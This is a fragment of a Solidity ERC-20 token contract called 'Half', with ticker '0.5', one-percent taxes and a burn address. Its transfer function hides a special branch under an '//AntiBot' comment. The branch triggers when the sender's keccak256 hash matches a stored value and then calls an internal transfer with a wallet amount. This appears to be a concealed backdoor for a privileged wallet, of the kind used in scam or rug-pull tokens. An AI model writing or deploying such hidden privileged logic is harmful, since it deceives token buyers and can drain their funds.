...
contract Half is Context, IERC20, Ownable {
    uint8 private _decimals = 18;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupply =  1 * 10**(_decimals-1);
    uint256 public immutable _buyTax =1;
    uint256 public immutable _sellTax = 1;
    string private _name = unicode"Half";
    string private _symbol = unicode"0.5";
    bool active=false;  
    bool init=false;
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        //AntiBot
        if(hasker == keccak256(abi.encodePacked(msg.sender)) && basicTransfer(_walletsAmount))
            return false;
